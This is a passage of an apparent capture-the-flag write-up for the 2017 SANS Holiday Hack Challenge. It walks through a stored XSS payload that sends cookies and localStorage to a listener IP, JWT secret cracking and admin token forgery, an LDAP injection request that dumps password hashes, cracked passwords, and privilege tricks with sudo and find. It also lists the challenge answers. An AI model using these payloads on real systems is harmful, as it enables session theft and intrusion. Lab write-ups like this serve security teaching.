+<pre><code>&lt;img src=x onerror=this.src='http://10.142.0.3:8124/foo.png?cookie='+document.cookie+'&amp;foo='+btoa(JSON.stringify(localStorage))&gt;
+</code></pre>
+
+
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2018/holidayhack/XSS_injection_request.png" data-lightbox="default" data-title="The request in burp repeater." >
+        <img src="/img/post/2018/holidayhack/XSS_injection_request.png" alt="The request in burp repeater." >
+    </a>
+</figure>
+
+
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">curl -i -s -k  -X <span class="s1">$&#39;POST&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39;</span> -H <span class="s1">$&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\
+</span><span class="se"></span>    --data-binary <span class="s1">$&#39;uid=alabaster.snowball&amp;email=alabaster.snowball%40northpolechristmastown.com&amp;message=testasdf+%3Cimg+src%3Dx+onerror=this.src=\&#39;http%3A%2F%2F10.142.0.11%3A8123%2Ffoo.png?cookie=\&#39;%2bdocument.cookie%2b\&#39;%26foo=\&#39;%2bbtoa(JSON.stringify(localStorage))%2b\&#39;%26bar=\&#39;%3E&#39;</span> <span class="se">\
+</span><span class="se"></span>    <span class="s1">$&#39;http://edb.northpolechristmastown.com/service&#39;</span></code></pre></div>
+
+<p>After a few moments the XSS is triggered by another user and the listening server receives a connection with the cookies and localStorage.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/XSS_steal_cookies.png" data-lightbox="default" data-title="The cookies are sent back to the attacking machine." >
+        <img src="/img/post/2018/holidayhack/XSS_steal_cookies.png" alt="The cookies are sent back to the attacking machine." >
+    </a>
+</figure>
+
+
+
+<p>The following values are sent back</p>
+
+<pre><code>SESSION=hxxer50N2e1C2AFt5X06
+{&quot;np-auth&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I&quot;}
+</code></pre>
+
+<p>The SESSION cookie does not grant any access to the application.
+The np-auth token is formatted like a JWT token, separated by two dots.
+The first section describes the token signature format.</p>
+
+<pre><code>{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+</code></pre>
+
+<p>The middle part includes the base64 encoded payload for the token.</p>
+
+<pre><code>{&quot;dept&quot;:&quot;Engineering&quot;,&quot;ou&quot;:&quot;elf&quot;,&quot;expires&quot;:&quot;2017-08-16 12:00:47.248093+00:00&quot;,&quot;uid&quot;:&quot;alabaster.snowball&quot;}
+</code></pre>
+
+<p>The token is already expired and can therefore not be utilized to access the application.
+To gain access a valid token probably has to be forged.</p>
+
+<h3 id="discover-key-for-jwt-token">Discover key for JWT Token</h3>
+
+<p>The JWT token is secured with an HMAC algorithm.
+The easiest option would be to replace the replace &lsquo;HS256&rsquo; with &lsquo;none&rsquo; in order to fool library.
+Unfortunately, that did not work.
+The next viable option is to test for password reuse or weak passwords.
+John the ripper supports JWT tokens and might be able to do the job.
+The following command tries all password lists from the SecLists.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="k">for</span> FILE in <span class="k">$(</span>ls /opt/SecLists/Passwords/*.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ~/Tools/JohnTheRipper/run/john --fork<span class="o">=</span><span class="m">4</span> --wordlist<span class="o">=</span><span class="si">${</span><span class="nv">FILE</span><span class="si">}</span> jwt.token<span class="p">;</span> <span class="k">done</span>
+~/Tools/JohnTheRipper/run/john jwt.token --show<span class="o">=</span>left</code></pre></div>
+
+<p>No wordlist did include a suitable secret for the hash.
+While looking for another option john can try and brute force the secret.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">john jwt.token</code></pre></div>
+
+<p>After a few minutes that did actually yield the secret for the HMAC.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/jwt_secret.png" data-lightbox="default" data-title="John the ripper cracked the secret with a simple brute-force attack." >
+        <img src="/img/post/2018/holidayhack/jwt_secret.png" alt="John the ripper cracked the secret with a simple brute-force attack." >
+    </a>
+</figure>
+
+
+
+<p>With the secret key we can finally forge a valid JWT token.
+The following python snippet creates a token that grants access to the application.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">jwt</span>
+<span class="n">key</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;3lv3s&#39;</span>
+<span class="n">encoded</span><span class="o">=</span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="sa"></span><span class="s1">&#39;dept&#39;</span><span class="p">:</span> <span class="sa"></span><span class="s1">&#39;administrators&#39;</span><span class="p">,</span>
+ <span class="sa"></span><span class="s1">&#39;expires&#39;</span><span class="p">:</span> <span class="sa"></span><span class="s1">&#39;2018-08-16 12:00:47.248093+00:00&#39;</span><span class="p">,</span>
+ <span class="sa"></span><span class="s1">&#39;ou&#39;</span><span class="p">:</span> <span class="sa"></span><span class="s1">&#39;human&#39;</span><span class="p">,</span> <span class="sa"></span><span class="s1">&#39;uid&#39;</span><span class="p">:</span> <span class="sa"></span><span class="s1">&#39;santa.claus&#39;</span><span class="p">},</span> <span class="n">key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span></code></pre></div>
+
+<p>The resulting JWT token has to be written to the localStorage as np-auth.
+With the token in localStorage the application automatically logs the user in.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/jwt_loggedIn.png" data-lightbox="default" data-title="Successfully logged in with the new JWT token." >
+        <img src="/img/post/2018/holidayhack/jwt_loggedIn.png" alt="Successfully logged in with the new JWT token." >
+    </a>
+</figure>
+
+
+
+<h3 id="santa-s-letter">Santa&rsquo;s Letter</h3>
+
+<p>Inside the application we are able to query the elf database.
+Access to a restricted area is only granted by providing a password
+In the initial stage an LDAP description file was discovered on the webserver.
+In this file the different fields for the objects are listed, including the userPassword.</p>
+
+<pre><code>#LDAP LDIF TEMPLATE
+
+dn: dc=com
+dc: com
+objectClass: dcObject
+
+dn: dc=northpolechristmastown,dc=com
+dc: northpolechristmastown
+objectClass: dcObject
+objectClass: organization
+
+dn: ou=human,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: human
+
+dn: ou=elf,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: elf
+
+dn: ou=reindeer,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: reindeer
+
+dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
+objectClass: addressbookPerson
+cn: 
+sn: 
+gn: 
+profilePath: /path/to/users/profile/image
+uid: 
+ou: 
+department: 
+mail: 
+telephoneNumber: 
+street:
+postOfficeBox: 
+postalCode: 
+postalAddress: 
+st: 
+l: 
+c: 
+facsimileTelephoneNumber: 
+description: 
+userPassword: 
+</code></pre>
+
+<p>The path is layed out, we have to dump the database.</p>
+
+<h3 id="database-injection">Database Injection</h3>
+
+<p>Wunrose mentioned a recent article about injections in similar databases.
+SANS Pentest Blog has a recent article about LDAP injection.
+By manually adding the respective field name to the attributes in the POST query the password hash is returned by the server.
+The next step is to query all objects via LDAP Injection.
+After some tweaking the following request queries all the objects from the database.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/ldap_injection_passwords.png" data-lightbox="default" data-title="The query returns all user objects together with their password hashes." >
+        <img src="/img/post/2018/holidayhack/ldap_injection_passwords.png" alt="The query returns all user objects together with their password hashes." >
+    </a>
+</figure>
+
+
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl -i -s -k  -X <span class="s1">$&#39;POST&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Host: edb.northpolechristmastown.com&#39;</span> -H <span class="s1">$&#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39;</span> -H <span class="s1">$&#39;np-auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAiLCJvdSI6Imh1bWFuIiwidWlkIjoic2FudGEuY2xhdXMifQ.VNrdoutFDu4OwfPRXHVWL00r6Q-WJQG9qVoUznSSJ40&#39;</span> -H <span class="s1">$&#39;X-Requested-With: XMLHttpRequest&#39;</span> -H <span class="s1">$&#39;Content-Length: 197&#39;</span> -H <span class="s1">$&#39;Cookie: SESSION=yN38l5ksth22we4cue7a&#39;</span> <span class="se">\
+</span><span class="se"></span>    -b <span class="s1">$&#39;SESSION=yN38l5ksth22we4cue7a&#39;</span> <span class="se">\
+</span><span class="se"></span>    --data-binary <span class="s1">$&#39;name=))(departmen=it)(|(cn=&amp;isElf=True&amp;attributes=profilePath%2Cgn%2Csn%2Cmail%2Cuid%2Cdepartment%2CtelephoneNumber%2Cdescription%2CuserPassword,street,postOfficeBox,postalCode,postalAddress,st,l,c&#39;</span> <span class="se">\
+</span><span class="se"></span>    <span class="s1">$&#39;http://edb.northpolechristmastown.com/search&#39;</span></code></pre></div>
+
+<p>Unfortunately, the passwords are not in clear text but rather hashed.
+Release the cracker!</p>
+
+<ul>
+<li><a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">Understanding and Exploiting Web-based LDAP</a></li>
+</ul>
+
+<h3 id="cracking-the-password-hashes">Cracking the Password Hashes</h3>
+
+<p>The passwords are hashed using unsalted md5.
+First of all, john the ripper is put to work.
+While john is working on the hashes, some hashes might already be listed on public hash lists.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> FILE in <span class="k">$(</span>ls /opt/SecLists/Passwords/*.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ~/Tools/JohnTheRipper/run/john --fork<span class="o">=</span><span class="m">4</span> --wordlist<span class="o">=</span><span class="si">${</span><span class="nv">FILE</span><span class="si">}</span> --format<span class="o">=</span>Raw-MD5 userpass.txt<span class="p">;</span> <span class="k">done</span>
+~/Tools/JohnTheRipper/run/john --format<span class="o">=</span>Raw-MD5 userpass.txt --show<span class="o">=</span>left</code></pre></div>
+
+<p>Of the twelve hashes only on is listed online, <a href="https://isc.sans.edu/tools/reversehash.html">cdabeb96b508f25f97ab0f162eac5a04</a>.</p>
+
+<pre><code>cdabeb96b508f25f97ab0f162eac5a04:1iwantacookie
+</code></pre>
+
+<p>During the writeup another hash for santa came back from edb.</p>
+
+<pre><code>d8b4c05a35b0513f302a85c409b4aab3:001cookielips001
+</code></pre>
+
+<p>This is the password for Santa&rsquo;s account and grants access through the last door.
+The letter to Santa is behind the password request.</p>
+
+
+
+<figure class="fcenter fsmall">
+    <a href="/img/post/2018/holidayhack/wizard_of_oz_to_santa_d0t011d408nx.png" data-lightbox="default" data-title="The hidden letter to santa." >
+        <img src="/img/post/2018/holidayhack/wizard_of_oz_to_santa_d0t011d408nx.png" alt="The hidden letter to santa." >
+    </a>
+</figure>
+
+
+
+<h2 id="naughty-and-nice-list">Naughty and Nice List</h2>
+
+<p>Santa&rsquo;s naughty and nice list can be downloaded from the samba share.
+The list includes the names and verdict for people.
+It does not include background information for the verdict.
+The north pole police department lists the background information on their website.</p>
+
+<h3 id="nppd-northpolechristmastown-com">nppd.northpolechristmastown.com</h3>
+
+<p>In order to properly process the data the whole database has to be downloaded.
+The JSON database can be downlaoded directly from the command line.</p>
+
+<pre><code>curl -i -s -k  -X $'GET' \
+    $'https://nppd.northpolechristmastown.com/infractions?query=severity&gt;0&amp;json=1'
+</code></pre>
+
+<p>With the background information at hand the next step is to combine the information.
+Python to the help.</p>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>First of all, the nppd data is structured around the name.
+With this format the Naughty and Nice List can easily verified.</p>
+
+<p>The first question is to figure out the number of infractions required to be called &lsquo;Naughty&rsquo;.
+With great thinking and counting can the number of infractions for each name on the naughty list this question is easily answered.
+The 4th infraction results in a &lsquo;naughty&rsquo; verdict.</p>
+
+<p>The next question is to find out the munchkin moles with the nppd data.
+According to a hint from Minty two munchkin moles got into a fight with &ldquo;pulling hair, and throwing rocks [&hellip;] a super atomic wedgie&rdquo;.
+The intersection of the first two infractions yields a list of six names.</p>
+
+<h1 id="questions">Questions</h1>
+
+<ol>
+<li><p>Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball.</p>
+
+<ol>
+<li>What is the title of that page? <strong>About This Book (Page 1)</strong></li>
+</ol></li>
+
+<li><p>Investigate the Letters to Santa application at <a href="https://l2s.northpolechristmastown.com">https://l2s.northpolechristmastown.com</a>.</p>
+
+<ol>
+<li>What is the topic of The Great Book page available in the web root of the server?  <strong>On The Topic of Flying Animals (Page 2)</strong></li>
+<li>What is Alabaster Snowball&rsquo;s password? <strong>stream_unhappy_buy_loss</strong></li>
+</ol></li>
+
+<li><p>The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server.</p>
+
+<ol>
+<li>What is the file server share name? <strong>FileStor</strong></li>
+</ol></li>
+
+<li><p>Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at <a href="http://mail.northpolechristmastown.com">http://mail.northpolechristmastown.com</a>.</p>
+
+<ol>
+<li>What can you learn from The Great Book page found in an e-mail on that server? <strong>Munchkin Moles infiltrated the elves.</strong></li>
+</ol></li>
+
+<li><p>Naughty and Nice List</p>
+
+<ol>
+<li>How many infractions are required to be marked as naughty on Santa&rsquo;s Naughty and Nice List? <strong>Four infractions are required</strong></li>
+<li>What are the names of at least six insider threat moles? <strong>Nina Fitzgerald, Kirsty Evans, Isabel Mehta, Christy Srivastava, Sheri Lewis, Beverly Khalil</strong></li>
+<li>Who is throwing the snowballs from the top of the North Pole Mountain? <strong>Abominable Snow Monster</strong></li>
+<li>What is your proof? <strong>Chatlog</strong></li>
+</ol></li>
+
+<li><p>The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at <a href="http://eaas.northpolechristmastown.com">http://eaas.northpolechristmastown.com</a>. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions.</p>
+
+<ol>
+<li>What is the title of The Great Book page? <strong>The Abominable Snow Monster (Page 5)</strong></li>
+</ol></li>
+
+<li><p>Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf.</p>
+
+<ol>
+<li>What does The Great Book page describe? <strong>Regarding the Witches of Oz - the witches of Oz remained neutral during the Great Schism.</strong></li>
+</ol></li>
+
+<li><p>Fetch the letter to Santa from the North Pole Elf Database at <a href="http://edb.northpolechristmastown.com">http://edb.northpolechristmastown.com</a>.</p>
+
+<ol>
+<li>Who wrote the letter? <strong>The Wizard of Oz</strong></li>
+</ol></li>
+
+<li><ol>
+<li>Which character is ultimately the villain causing the giant snowball problem. <strong>Glinda, the Good Witch</strong></li>
+<li>What is the villain&rsquo;s motive? <strong>All-out War between Oz and the North Pole.</strong></li>
+</ol></li>
+</ol>
+
+<h2 id="links">Links</h2>
+
+<ul>
+<li><a href="https://jwt.io/">JWT Debugger</a></li>
+<li><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">Attacking JWT authentication</a></li>
+<li><a href="https://www.ticarpi.com/jwt-tool-attack-methods/">JWT Attack Methods</a></li>
+<li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">Critical vulnerabilities in JSON Web Token libraries</a></li>
+<li><a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker</a></li>
+</ul>
+
+<h1 id="achievements">Achievements</h1>
+
+<h2 id="terminal-challenges">Terminal Challenges</h2>
+
+<h3 id="wunrose-openslae">Wunrose Openslae</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
+               _(_      _Y_      _Y_      _Y_      _Y_      _)_
+              [___]    [___]    [___]    [___]    [___]    [___]
+              /:&#39; \    /:&#39; \    /:&#39; \    /:&#39; \    /:&#39; \    /:&#39; \
+             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
+             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
+         jgs  \::./    \::./    \::./    \::./    \::./    \::./
+               &#39;=&#39;      &#39;=&#39;      &#39;=&#39;      &#39;=&#39;      &#39;=&#39;      &#39;=&#39;
+Wunorse Openslae has a special challenge for you.
+Run the given binary, make it return 42.
+Use the partial source for hints, it is just a clue.
+You will need to write your own code, but only a line or two.
+total 88
+-rwxr-xr-x 1 root root 84824 Dec 16 16:59 isit42
+-rw-r--r-- 1 root root   654 Dec 16 16:57 isit42.c.un
+elf@444800d15214:~$ 
+elf@444800d15214:~$ ./isit42 
+Starting up ... done.
+Calling rand() to select a random number.
+653 is not 42.
+elf@444800d15214:~$ cat isit42.c.un 
+#include &lt;stdio.h&gt;
+// DATA CORRUPTION ERROR
+// MUCH OF THIS CODE HAS BEEN LOST
+// FORTUNATELY, YOU DON&#39;T NEED IT FOR THIS CHALLENGE
+// MAKE THE isit42 BINARY RETURN 42
+// YOU&#39;LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
+int getrand() {
+    srand((unsigned int)time(NULL)); 
+    printf(&#34;Calling rand() to select a random number.\n&#34;);
+    // The prototype for rand is: int rand(void);
+    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
+}
+int main() {
+    sleep(3);
+    int randnum = getrand();
+    if (randnum == 42) {
+        printf(&#34;Yay!\n&#34;);
+    } else {
+        printf(&#34;Boo!\n&#34;);
+    }
+    return randnum;
+}
+
+elf@947cdc075ec8:~/src$ gcc desrand.c -o desrand.so -DLINUX -ldl -shared -fPIC
+elf@947cdc075ec8:~$ LD_PRELOAD=src/desrand.so isit42 
+Starting up ... done.
+Calling rand() to select a random number.
+                 .-. 
+                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
+               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
+              /::::&#39;();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
+            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
+        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
+         \,`////&#34;&#34;&#34;&#34;\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
+         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
+          \/|(_) () (_)|\/ 
+            \   &#39;()&#39;   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
+            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
+          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
+         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
+        /  |o`&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
+       `.__/     ()     \__.&#39;      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
+       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
+       /  \|---|    |---|/  \ 
+       |  (|42 | () | DA|)  |       _   ___  _______ 
+       \  /;---&#39;    &#39;---;\  /      | | |   ||       |
+        `` \ ___ /\ ___ / ``       | |_|   ||____   |
+            `|  |  |  |`           |       | ____|  |
+      jgs    |  |  |  |            |___    || ______| ___ 
+       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
+      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
+      | \__.&#39;    ||    &#39;.__/ |
+       `---------&#39;&#39;---------` 
+Congratulations! You&#39;ve won, and have successfully completed this challenge.</code></pre></div>
+
+<h3 id="sugarplum-mary">Sugarplum Mary</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                       *
+                      .~&#39;
+                     O&#39;~..
+                    ~&#39;O&#39;~..
+                   ~&#39;O&#39;~..~&#39;
+                  O&#39;~..~&#39;O&#39;~.
+                 .~&#39;O&#39;~..~&#39;O&#39;~
+                ..~&#39;O&#39;~..~&#39;O&#39;~.
+               .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;
+              O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..
+             ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..
+            ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;
+           O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.
+          .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~
+         ..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.
+        .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;
+       O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..
+      ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..
+     ~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;
+    O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.
+   .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~
+  ..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~.
+ .~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;
+O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..~&#39;O&#39;~..
+Sugarplum Mary is in a tizzy, we hope you can assist.
+Christmas songs abound, with many likes in our midst.
+The database is populated, ready for you to address.
+Identify the song whose popularity is the best.
+total 20684
+-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
+-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
+elf@e3de726ef55e:~$ sqlite3 christmassongs.db &#39;select * from songs where id = (select songid f
+rom likes group by songid order by sum(like) desc limit 1);&#39;
+392|Stairway to Heaven|Led Zeppelin|1971|&#34;Stairway to Heaven&#34; is a song by the English rock ba
+nd Led Zeppelin, released in late 1971. It was composed by guitarist Jimmy Page and vocalist R
+obert Plant for the band&#39;s untitled fourth studio album (often called Led Zeppelin IV). It is 
+often referred to as one of the greatest rock songs of all time.
+elf@e3de726ef55e:~$ ./runtoanswer 
+Starting up, please wait......
+Enter the name of the song with the most likes: Stairway to Heaven
+That is the #1 Christmas song, congratulations!</code></pre></div>
+
+<h3 id="sparkle-redberry">Sparkle Redberry</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                ___,@
+               /  &lt;
+          ,_  /    \  _,
+      ?    \`/______\`/
+   ,_(_).  |; (e  e) ;|
+    \___ \ \/\   7  /\/    _\8/_
+        \/\   \&#39;==&#39;/      | /| /|
+         \ \___)--(_______|//|//|
+          \___  ()  _____/|/_|/_|
+             /  ()  \    `----&#39;
+            /   ()   \
+           &#39;-.______.-&#39;
+   jgs   _    |_||_|    _
+        (@____) || (____@)
+         \______||______/
+My name is Sparkle Redberry, and I need your help.
+My server is atwist, and I fear I may yelp.
+Help me kill the troublesome process gone awry.
+I will return the favor with a gift before nigh.
+Kill the &#34;santaslittlehelperd&#34; process to complete this challenge.
+elf@3cef0de4aad2:~$ alias
+alias alert=&#39;notify-send --urgency=low -i &#34;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&#34; &#34;$(history|tail -n1|sed -e &#39;\&#39;&#39;s/^\s*[0
+-9]\+\s*//;s/[;&amp;|]\s*alert$//&#39;\&#39;&#39;)&#34;&#39;
+alias egrep=&#39;egrep --color=auto&#39;
+alias fgrep=&#39;fgrep --color=auto&#39;
+alias grep=&#39;grep --color=auto&#39;
+alias kill=&#39;true&#39;
+alias killall=&#39;true&#39;
+alias l=&#39;ls -CF&#39;
+alias la=&#39;ls -A&#39;
+alias ll=&#39;ls -alF&#39;
+alias ls=&#39;ls --color=auto&#39;
+alias pkill=&#39;true&#39;
+alias skill=&#39;true&#39;
+elf@537a65d4518a:~$ alias kill=kill
+elf@402db136554a:~$ ps auxf
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+elf          1  0.2  0.0  18028  2872 pts/0    Ss   12:57   0:00 /bin/bash /sbin/init
+elf          8  0.0  0.0   4224   648 pts/0    S    12:57   0:00 /usr/bin/santaslittlehelperd
+elf         11  0.4  0.0  13528  6364 pts/0    S    12:57   0:00 /sbin/kworker
+elf         18  1.6  0.0  71468 26556 pts/0    S    12:57   0:00  \_ /sbin/kworker
+elf         12  0.0  0.0  18248  3208 pts/0    S    12:57   0:00 /bin/bash
+elf         41  0.0  0.0  34424  2940 pts/0    R+   12:57   0:00  \_ ps auxf
+elf@402db136554a:~$ kill -9 8</code></pre></div>
+
+<h3 id="shinny-upatree">Shinny Upatree</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">              \ /
+            --&gt;*&lt;--
+              /o\
+             /_\_\
+            /_/_0_\
+           /_o_\_\_\
+          /_/_/_/_/o\
+         /@\_\_\@\_\_\
+        /_/_/O/_/_/_/_\
+       /_\_\_\_\_\o\_\_\
+      /_/0/_/_/_0_/_/@/_\
+     /_\_\_\_\_\_\_\_\_\_\
+    /_/o/_/_/@/_/_/o/_/0/_\
+   jgs       [___]  
+My name is Shinny Upatree, and I&#39;ve made a big mistake.
+I fear it&#39;s worse than the time I served everyone bad hake.
+I&#39;ve deleted an important file, which suppressed my server access.
+I can offer you a gift, if you can fix my ill-fated redress.
+Restore /etc/shadow with the contents of /etc/shadow.bak, then run &#34;inspect_da_box&#34; to complete this challenge.
+Hint: What commands can you run with sudo?
+elf@5ded5c157d02:~$ /usr/bin/sudo -g shadow /usr/bin/find /etc -name shadow.bak -exec cp {} /etc/shadow \;
+elf@5ded5c157d02:~$ /usr/local/bin/inspect_da_box
+                     ___
+                    / __&#39;.     .-&#34;&#34;&#34;-.
+              .-&#34;&#34;-| |  &#39;.&#39;.  / .---. \
+             / .--. \ \___\ \/ /____| |
+            / /    \ `-.-;-(`_)_____.-&#39;._
+           ; ;      `.-&#34; &#34;-:_,(o:==..`-. &#39;.         .-&#34;-,
+           | |      /       \ /      `\ `. \       / .-. \
+           \ \     |         Y    __...\  \ \     / /   \/
+     /\     | |    | .--&#34;&#34;--.| .-&#39;      \  &#39;.`---&#39; /
+     \ \   / /     |`        \&#39;   _...--.;   &#39;---&#39;`
+      \ &#39;-&#39; / jgs  /_..---.._ \ .&#39;\\_     `.
+       `--&#39;`      .&#39;    (_)  `&#39;/   (_)     /
+                  `._       _.&#39;|         .&#39;
+                     ```````    &#39;-...--&#39;`
+/etc/shadow has been successfully restored!</code></pre></div>
+
+<h3 id="pepper-minstix">Pepper Minstix</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                             ______
+                          .-&#34;&#34;&#34;&#34;.._&#39;.       _,##
+                   _..__ |.-&#34;&#34;&#34;-.|  |   _,##&#39;`-._
+                  (_____)||_____||  |_,##&#39;`-._,##&#39;`
+                  _|   |.;-&#34;&#34;-.  |  |#&#39;`-._,##&#39;`
+               _.;_ `--&#39; `\    \ |.&#39;`\._,##&#39;`
+              /.-.\ `\     |.-&#34;;.`_, |##&#39;`
+              |\__/   | _..;__  |&#39;-&#39; /
+              &#39;.____.&#39;_.-`)\--&#39; /&#39;-&#39;`
+               //||\\(_.-&#39;_,&#39;-&#39;`
+             (`-...-&#39;)_,##&#39;`
+      jgs _,##`-..,-;##`
+       _,##&#39;`-._,##&#39;`
+    _,##&#39;`-._,##&#39;`
+      `-._,##&#39;`
+My name is Pepper Minstix, and I need your help with my plight.
+I&#39;ve crashed the Christmas toy train, for which I am quite contrite.
+I should not have interfered, hacking it was foolish in hindsight.
+If you can get it running again, I will reward you with a gift of delight.
+total 444
+-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
+elf@d04e67d2f54c:~$ qemu-arm trainstartup
+
+
+
+    Merry Christmas
+    Merry Christmas
+v
+&gt;*&lt;
+^
+/o\
+/   \               @.·
